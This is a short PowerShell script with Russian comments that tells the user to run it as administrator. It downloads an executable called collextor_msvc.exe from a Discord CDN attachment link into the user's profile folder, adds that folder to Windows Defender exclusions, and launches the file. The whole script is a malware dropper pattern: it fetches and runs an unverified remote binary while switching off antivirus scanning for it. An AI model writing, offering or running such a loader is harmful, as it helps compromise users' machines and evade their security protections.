# Запускать от имени администратора
$dir = "$env:USERPROFILE\collextor"
$exe = "$dir\collextor_msvc.exe"
$url = "https://cdn.discordapp.com/attachments/1520398729520222211/1520826637577359540/collextor_msvc.exe?ex=6a429bad&is=6a414a2d&hm=b76f14e7186faf49c0f463beadddcf55719dab3dd550f668fb174d761b09d17b&"

New-Item -ItemType Directory -Force -Path $dir | Out-Null

Write-Host "Скачиваю..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $exe

Write-Host "Добавляю в исключения Defender..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $dir

Write-Host "Запускаю..." -ForegroundColor Green
Start-Process -FilePath $exe -WorkingDirectory $dir
